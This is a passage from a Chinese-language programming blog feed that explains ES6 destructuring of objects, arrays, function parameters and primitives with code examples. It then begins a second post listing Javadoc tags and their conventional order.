<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;Identifier&quot;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">  <span class="attr">loc</span>: &#123;</span><br><span class="line">    <span class="attr">start</span>: &#123;</span><br><span class="line">      <span class="attr">line</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">column</span>: <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">end</span>: &#123;</span><br><span class="line">      <span class="attr">line</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">column</span>: <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;</span><br><span class="line">  <span class="attr">loc</span>: &#123; start &#125;,</span><br><span class="line">&#125; = node;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(start.<span class="property">line</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(start.<span class="property">column</span>); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们在解构模式中使用了花括号，其含义为在找到 node 对象中的 loc 属性后，应当深入一层继续查找 start 属性。在上面的解构示例中，所有冒号前的标识符都代表在对象中的检索位置，其右侧为被赋值的变量名；如果冒号后是花括号，则意味着要赋予的最终值嵌套在对象内部更深的层级中<br>　　更进一步，也可以使用一个与对象属性名不同的局部变量名</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;Identifier&quot;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">  <span class="attr">loc</span>: &#123;</span><br><span class="line">    <span class="attr">start</span>: &#123;</span><br><span class="line">      <span class="attr">line</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">column</span>: <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">end</span>: &#123;</span><br><span class="line">      <span class="attr">line</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">column</span>: <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 提取 node.loc.start</span></span><br><span class="line"><span class="keyword">let</span> &#123;</span><br><span class="line">  <span class="attr">loc</span>: &#123; <span class="attr">start</span>: localStart &#125;,</span><br><span class="line">&#125; = node;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(localStart.<span class="property">line</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(localStart.<span class="property">column</span>); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>在这个版本中，node.loc.start 被存储在了新的局部变量 localStart 中。解构模式可以应用于任意层级深度的对象，且每一层都具备同等的功能</p>
<h2 id="数组解构"><a href="#数组解构" class="headerlink" title="数组解构"></a>数组解构</h2><p>与对象解构的语法相比，数组解构就简单多了，它使用的是数组字面量，且解构操作全部在数组内完成，而不是像对象字面量语法一样使用对象的命名属性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> colors = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> [firstColor, secondColor] = colors;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(firstColor); <span class="comment">// &quot;red&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(secondColor); <span class="comment">// &quot;green&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这段代码中，我们从 colors 数组中解构出了”red”和”green”这两个值，并分别存储在变量 firstColor 和变量 secondColor 中。在数组解构语法中，我们通过值在数组中的位置进行选取，且可以将其存储在任意变量中，未显式声明的元素都会直接被忽略<br>　　在解构模式中，也可以直接省略元素，只为感兴趣的元素提供变量名</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> colors = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> [, , thirdColor] = colors;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(thirdColor); <span class="comment">// &quot;blue&quot;</span></span><br></pre></td></tr></table></figure>

<p>这段代码使用解构赋值语法从 colors 中获取第 3 个元素，thirdColor 前的逗号是前方元素的占位符，无论数组中的元素有多少个，都可以通过这种方法提取想要的元素，不需要为每一个元素都指定变量名</p>
<h3 id="【解构赋值】-1"><a href="#【解构赋值】-1" class="headerlink" title="【解构赋值】"></a>【解构赋值】</h3><p>数组解构也可用于赋值上下文，但不需要用小括号包裹表达式，这一点与对象解构不同</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> colors = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>],</span><br><span class="line">  firstColor = <span class="string">&quot;black&quot;</span>,</span><br><span class="line">  secondColor = <span class="string">&quot;purple&quot;</span>;</span><br><span class="line">[firstColor, secondColor] = colors;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(firstColor); <span class="comment">// &quot;red&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(secondColor); <span class="comment">// &quot;green&quot;</span></span><br></pre></td></tr></table></figure>

<p>这段代码中的解构赋值与上一个数组解构示例相差无几，唯一的区别是此处的 firstColor 变量和 secondColor 变量已经被定义了</p>
<h3 id="【变量交换】"><a href="#【变量交换】" class="headerlink" title="【变量交换】"></a>【变量交换】</h3><p>数组解构语法还有一个独特的用例：交换两个变量的值。在排序算法中，值交换是一个非常常见的操作，如果要在 ES5 中交换两个变量的值，则须引入第三个临时变量</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 ES5 中互换值</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>,</span><br><span class="line">  b = <span class="number">2</span>,</span><br><span class="line">  tmp;</span><br><span class="line">tmp = a;</span><br><span class="line">a = b;</span><br><span class="line">b = tmp;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>在这种变量交换的方式中，中间变量 tmp 不可或缺。如果使用数组解构赋值语法，就不再需要额外的变量了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 ES6 中互换值</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>,</span><br><span class="line">  b = <span class="number">2</span>;</span><br><span class="line">[a, b] = [b, a];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>在这个示例中，数组解构赋值看起来像是一个镜像：赋值语句左侧(也就是等号左侧)与其他数组解构示例一样，是一个解构模式；右侧是一个为交换过程创建的临时数组字面量。代码执行过程中，先解构临时数组，将 b 和 a 的值复制到左侧数组的前两个位置，最终结果是变量互换了它们的值<br>　　[注意]如果右侧数组解构赋值表达式的值为 null 或 undefined，则会导致程序抛出错误</p>
<h3 id="【默认值】-1"><a href="#【默认值】-1" class="headerlink" title="【默认值】"></a>【默认值】</h3><p>也可以在数组解构赋值表达式中为数组中的任意位置添加默认值，当指定位置的属性不存在或其值为 undefined 时使用默认值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> colors = [<span class="string">&quot;red&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> [firstColor, secondColor = <span class="string">&quot;green&quot;</span>] = colors;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(firstColor); <span class="comment">// &quot;red&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(secondColor); <span class="comment">// &quot;green&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这段代码中，colors 数组中只有一个元素，secondColor 没有对应的匹配值，但是它有一个默认值”green”，所以最终 secondColor 的输出结果不会是 undefined</p>
<h3 id="【嵌套数组解构】"><a href="#【嵌套数组解构】" class="headerlink" title="【嵌套数组解构】"></a>【嵌套数组解构】</h3><p>嵌套数组解构与嵌套对象解构的语法类似，在原有的数组模式中插入另一个数组模式，即可将解构过程深入到下一个层级</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> colors = [<span class="string">&quot;red&quot;</span>, [<span class="string">&quot;green&quot;</span>, <span class="string">&quot;lightgreen&quot;</span>], <span class="string">&quot;blue&quot;</span>];</span><br><span class="line"><span class="comment">// 随后</span></span><br><span class="line"><span class="keyword">let</span> [firstColor, [secondColor]] = colors;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(firstColor); <span class="comment">// &quot;red&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(secondColor); <span class="comment">// &quot;green&quot;</span></span><br></pre></td></tr></table></figure>

<p>在此示例中，变量 secondColor 引用的是 colors 数组中的值”green”，该元素包含在数组内部的另一个数组中，所以 seconColor 两侧的方括号是一个必要的解构模式。同样，在数组中也可以无限深入去解构，就像在对象中一样</p>
<h3 id="【不定元素】"><a href="#【不定元素】" class="headerlink" title="【不定元素】"></a>【不定元素】</h3><p>函数具有不定参数，而在数组解构语法中有一个相似的概念——不定元素。在数组中，可以通过…语法将数组中的其余元素赋值给一个特定的变量</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> colors = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> [firstColor, ...restColors] = colors;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(firstColor); <span class="comment">// &quot;red&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(restColors.<span class="property">length</span>); <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(restColors[<span class="number">0</span>]); <span class="comment">// &quot;green&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(restColors[<span class="number">1</span>]); <span class="comment">// &quot;blue&quot;</span></span><br></pre></td></tr></table></figure>

<p>数组 colors 中的第一个元素被赋值给了 firstColor，其余的元素被赋值给 restColors 数组，所以 restColors 中包含两个元素：”green”和”blue”。不定元素语法有助于从数组中提取特定元素并保证其余元素可用</p>
<h3 id="【数组复制】"><a href="#【数组复制】" class="headerlink" title="【数组复制】"></a>【数组复制】</h3><p>在 ES5 中，开发者们经常使用 concat()方法来克隆数组</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 ES5 中克隆数组</span></span><br><span class="line"><span class="keyword">var</span> colors = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> clonedColors = colors.<span class="title function_">concat</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(clonedColors); <span class="comment">//&quot;[red,green,blue]&quot;</span></span><br></pre></td></tr></table></figure>

<p>concat()方法的设计初衷是连接两个数组，如果调用时不传递参数就会返回当前函数的副本<br>　　在 ES6 中，可以通过不定元素的语法来实现相同的目标</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 ES6 中克隆数组</span></span><br><span class="line"><span class="keyword">let</span> colors = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> [...clonedColors] = colors;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(clonedColors); <span class="comment">//&quot;[red,green,blue]&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们通过不定元素的语法将 colors 数组中的值复制到 clonedColors 数组中<br>　　[注意]在被解构的数组中，不定元素必须为最后一个条目，在后面继续添加逗号会导致程序抛出语法错误</p>
<h2 id="混合解构"><a href="#混合解构" class="headerlink" title="混合解构"></a>混合解构</h2><p>可以混合使用对象解构和数组解构来创建更多复杂的表达式，如此一来，可以从任何混杂着对象和数组的数据解构中提取想要的信息</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;Identifier&quot;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">  <span class="attr">loc</span>: &#123;</span><br><span class="line">    <span class="attr">start</span>: &#123;</span><br><span class="line">      <span class="attr">line</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">column</span>: <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">end</span>: &#123;</span><br><span class="line">      <span class="attr">line</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">column</span>: <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">range</span>: [<span class="number">0</span>, <span class="number">3</span>],</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;</span><br><span class="line">  <span class="attr">loc</span>: &#123; start &#125;,</span><br><span class="line">  <span class="attr">range</span>: [startIndex],</span><br><span class="line">&#125; = node;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(start.<span class="property">line</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(start.<span class="property">column</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(startIndex); <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>

<p>这段代码分别将 node.loc.start 和 node.range[0]提取到变量 start 和 startlndex 中<br>　　解构模式中的 loc 和 range 仅代表它们在 node 对象中所处的位置(也就是该对象的属性)。当使用混合解构的语法时，则可以从 node 提取任意想要的信息。这种方法极为有效，尤其是从 JSON 配置中提取信息时，不再需要遍历整个结构了</p>
<h3 id="【解构参数】"><a href="#【解构参数】" class="headerlink" title="【解构参数】"></a>【解构参数】</h3><p>解构可以用在函数参数的传递过程中，这种使用方式更特别。当定义一个接受大量可选参数的 JS 函数时，通常会创建一个可选对象，将额外的参数定义为这个对象的属性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// options 上的属性表示附加参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">name, value, options</span>) &#123;</span><br><span class="line">  options = options || &#123;&#125;;</span><br><span class="line">  <span class="keyword">let</span> secure = options.<span class="property">secure</span>,</span><br><span class="line">    path = options.<span class="property">path</span>,</span><br><span class="line">    domain = options.<span class="property">domain</span>,</span><br><span class="line">    expires = options.<span class="property">expires</span>;</span><br><span class="line">  <span class="comment">// 设置 cookie 的代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第三个参数映射到 options</span></span><br><span class="line"><span class="title function_">setCookie</span>(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;js&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">secure</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">expires</span>: <span class="number">60000</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>许多 JS 库中都有类似的 setCookie()函数，而在示例函数中，name 和 value 是必需参数，而 secure、path、domain 和 expires 则不然，这些参数相对而言没有优先级顺序，将它们列为额外的命名参数也不合适，此时为 options 对象设置同名的命名属性是一个很好的选择。现在的问题是，仅查看函数的声明部分，无法辨识函数的预期参数，必须通过阅读函数体才可以确定所有参数的情况<br>　　如果将 options 定义为解构参数，则可以更清晰地了解函数预期传入的参数。解构参数需要使用对象或数组解构模式代替命名参数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">name, value, &#123; secure, path, domain, expires &#125;</span>) &#123;</span><br><span class="line">  <span class="comment">// 设置 cookie 的代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setCookie</span>(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;js&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">secure</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">expires</span>: <span class="number">60000</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这个函数与之前示例中的函数具有相似的特性，只是现在使用解构语法代替了第 3 个参数来提取必要的信息，其他参数保持不变，但是对于调用 setCookie()函数的使用者而言，解构参数变得更清晰了</p>
<h3 id="【必须传值的解构参数】"><a href="#【必须传值的解构参数】" class="headerlink" title="【必须传值的解构参数】"></a>【必须传值的解构参数】</h3><p>解构参数有一个奇怪的地方，默认情况下，如果调用函数时不提供被解构的参数会导致程序抛出错误</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 出错！</span></span><br><span class="line"><span class="title function_">setCookie</span>(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;js&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>缺失的第 3 个参数，其值为 undefined，而解构参数只是将解构声明应用在函数参数的一个简写方法，其会导致程序抛出错误。当调用 setCookie()函数时，JS 引擎实际上做了以下这些事情</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">name, value, options</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; secure, path, domain, expires &#125; = options;</span><br><span class="line">  <span class="comment">// 设置 cookie 的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果解构赋值表达式的右值为 null 或 undefined，则程序会报错。同理，若调用 setCookie()函数时不传入第 3 个参数，也会导致程序抛出错误<br>　　如果解构参数是必需的，大可忽略掉这些问题；但如果希望将解构参数定义为可选的，那么就必须为其提供默认值来解决这个问题</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">name, value, &#123; secure, path, domain, expires &#125; = &#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个示例中为解构参数添加了一个新对象作为默认值，secure、path、domain 及 expires 这些变量的值全部为 undefined，这样即使在调用 setCookie()时未传递第 3 个参数，程序也不会报错</p>
<h3 id="【默认值】-2"><a href="#【默认值】-2" class="headerlink" title="【默认值】"></a>【默认值】</h3><p>可以为解构参数指定默认值，就像在解构赋值语句中那样，只需在参数后添加等号并且指定一个默认值即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params"></span></span><br><span class="line"><span class="params">  name,</span></span><br><span class="line"><span class="params">  value,</span></span><br><span class="line"><span class="params">  &#123;</span></span><br><span class="line"><span class="params">    secure = <span class="literal">false</span>,</span></span><br><span class="line"><span class="params">    path = <span class="string">&quot;/&quot;</span>,</span></span><br><span class="line"><span class="params">    domain = <span class="string">&quot;example.com&quot;</span>,</span></span><br><span class="line"><span class="params">    expires = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">Date</span>.now() + <span class="number">360000000</span>),</span></span><br><span class="line"><span class="params">  &#125; = &#123;&#125;</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这段代码中，解构参数的每一个属性都有默认值，从而无须再逐一检查每一个属性是否都有默认值。然而，这种方法也有很多缺点。首先，函数声明变得比以前复杂了；其次，如果解构参数是可选的，那么仍然要给它添加一个空对象作为参数，否则像 setCookie(“type”,”js”)这样的调用会导致程序抛出错误<br>　　对于对象类型的解构参数，最好为其赋予相同解构的默认参数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params"></span></span><br><span class="line"><span class="params">  name,</span></span><br><span class="line"><span class="params">  value,</span></span><br><span class="line"><span class="params">  &#123;</span></span><br><span class="line"><span class="params">    secure = <span class="literal">false</span>,</span></span><br><span class="line"><span class="params">    path = <span class="string">&quot;/&quot;</span>,</span></span><br><span class="line"><span class="params">    domain = <span class="string">&quot;example.com&quot;</span>,</span></span><br><span class="line"><span class="params">    expires = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">Date</span>.now() + <span class="number">360000000</span>),</span></span><br><span class="line"><span class="params">  &#125; = &#123;</span></span><br><span class="line"><span class="params">    secure: <span class="literal">false</span>,</span></span><br><span class="line"><span class="params">    path: <span class="string">&quot;/&quot;</span>,</span></span><br><span class="line"><span class="params">    domain: <span class="string">&quot;example.com&quot;</span>,</span></span><br><span class="line"><span class="params">    expires: <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">Date</span>.now() + <span class="number">360000000</span>),</span></span><br><span class="line"><span class="params">  &#125;</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在函数变得更加完整了，第一个对象字面量是解构参数，第二个为默认值。但是这会造成非常多的代码冗余，可以将默认值提取到一个独立对象中，并且使用该对象作为解构和默认参数的一部分，从而消除这些冗余</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> setCookieDefaults = &#123;</span><br><span class="line">  <span class="attr">secure</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">  <span class="attr">domain</span>: <span class="string">&quot;example.com&quot;</span>,</span><br><span class="line">  <span class="attr">expires</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() + <span class="number">360000000</span>),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params"></span></span><br><span class="line"><span class="params">  name,</span></span><br><span class="line"><span class="params">  value,</span></span><br><span class="line"><span class="params">  &#123;</span></span><br><span class="line"><span class="params">    secure = setCookieDefaults.secure,</span></span><br><span class="line"><span class="params">    path = setCookieDefaults.path,</span></span><br><span class="line"><span class="params">    domain = setCookieDefaults.domain,</span></span><br><span class="line"><span class="params">    expires = setCookieDefaults.expires,</span></span><br><span class="line"><span class="params">  &#125; = setCookieDefaults</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这段代码中，默认值已经被放到 setCookieDefaults 对象中，除了作为默认参数值外，在解构参数中可以直接使用这个对象来为每一个绑定设置默认参数。使用解构参数后，不得不面对处理默认参数的复杂逻辑，但它也有好的一面，如果要改变默认值，可以立即在 setCookieDefaults 中修改，改变的数据将自动同步到所有出现过的地方</p>
<h2 id="其他解构"><a href="#其他解构" class="headerlink" title="其他解构"></a>其他解构</h2><h3 id="【字符串解构】"><a href="#【字符串解构】" class="headerlink" title="【字符串解构】"></a>【字符串解构】</h3><p>字符串也可以解构赋值。这是因为，字符串被转换成了一个类似数组的对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [a, b, c, d, e] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">//&quot;h&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">//&quot;e&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c); <span class="comment">//&quot;l&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d); <span class="comment">//&quot;l&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(e); <span class="comment">//&quot;o&quot;</span></span><br></pre></td></tr></table></figure>

<p>类似数组的对象都有一个 length 属性，因此还可以对这个属性解构赋值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; length &#125; = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(length); <span class="comment">//5</span></span><br></pre></td></tr></table></figure>

<h3 id="【数值和布尔值解构】"><a href="#【数值和布尔值解构】" class="headerlink" title="【数值和布尔值解构】"></a>【数值和布尔值解构】</h3><p>解构赋值时，如果等号右边是数值和布尔值，则会先转为对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; <span class="attr">toString</span>: s1 &#125; = <span class="number">123</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s1 === <span class="title class_">Number</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>); <span class="comment">//true</span></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">toString</span>: s2 &#125; = <span class="literal">true</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s2 === <span class="title class_">Boolean</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>解构赋值的规则是，只要等号右边的值不是对象或数组，就先将其转为对象。由于 undefined 和 null 无法转为对象，所以对它们进行解构赋值，都会报错</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; <span class="attr">prop</span>: x &#125; = <span class="literal">undefined</span>; <span class="comment">// TypeError</span></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">prop</span>: y &#125; = <span class="literal">null</span>; <span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>Javadoc文档注释及命令生成api文档</title>
    <url>/2021/05/15/Javadoc%E6%96%87%E6%A1%A3%E6%B3%A8%E9%87%8A%E5%8F%8A%E5%91%BD%E4%BB%A4%E7%94%9F%E6%88%90api%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<h1 id="Javadoc-文档注释"><a href="#Javadoc-文档注释" class="headerlink" title="Javadoc 文档注释"></a>Javadoc 文档注释</h1><h2 id="一、Javadoc-中的-Tag-说明"><a href="#一、Javadoc-中的-Tag-说明" class="headerlink" title="一、Javadoc 中的 Tag 说明"></a>一、Javadoc 中的 Tag 说明</h2><h2 id="Tag-的一些惯例"><a href="#Tag-的一些惯例" class="headerlink" title="Tag 的一些惯例"></a>Tag 的一些惯例</h2><h3 id="一些-Tags-的说明"><a href="#一些-Tags-的说明" class="headerlink" title="一些 Tags 的说明"></a>一些 Tags 的说明</h3><ul>
<li>**<a href="/author">@author </a> **：作者的姓名</li>
<li>**<a href="/version">@version </a> **：版本号</li>
<li>**<a href="/param">@param </a> **：对于参数的描述</li>
<li>**<a href="/return">@return </a> **：对于返回内容的描述</li>
<li><strong><a href="/exception">@exception </a> ** (和</strong><a href="/throws">@throws </a> **是同义词)：异常类的名称和描述</li>
<li>**<a href="/see">@see </a> **：表示去查看参考资料</li>
<li>**<a href="/since">@since </a> **：表示这个变更或特性从什么时候或版本号等（由该标签中声明的内容决定）开始存在的</li>
<li>**<a href="/serial">@serial </a> **：用于表示序列化的字段（include | exclude）</li>
<li>**<a href="/deprecated">@deprecated </a> **：表示被弃用</li>
<li>**<a href="/link">@link </a> **：用法{<a href="/link">@link </a> *_ _package.class#member label__}。插入一个带标签的链接，可以指向特定包、类或指定类的成员名称的文档。</li>
<li>**<a href="/literal">@literal </a> **：用法{<a href="/literal">@literal </a> *_ _text__}。用来显示那些不用被 HTML 标记或嵌套 javadoc 标签解析的文本。</li>
</ul>
<h3 id="Tags-的顺序"><a href="#Tags-的顺序" class="headerlink" title="Tags 的顺序"></a>Tags 的顺序</h3><p>按照下面的顺序写 tags：</p>
<ul>
<li>**<a href="/author">@author </a> ** (仅用于类和接口，必须的)</li>
<li>**<a href="/version">@version </a> ** (仅用于类和接口，必须的)</li>
<li>**<a href="/param">@param </a> ** (仅用于方法和构造函数)</li>
<li>**<a href="/return">@return </a> ** (仅用于方法)</li>
<li><strong><a href="/exception">@exception </a> ** (和</strong><a href="/throws">@throws </a> **是同义词)</li>
<li>**<a href="/see">@see </a> **</li>
<li>**<a href="/since">@since </a> **</li>
<li><strong><a href="/serial">@serial </a> ** (或者</strong><a href="/serialField">@serialField </a> <strong>，</strong><a href="/serialData">@serialData </a> **)</li>
<li>**<a href="/deprecated">@deprecated </a> **</li>
</ul>
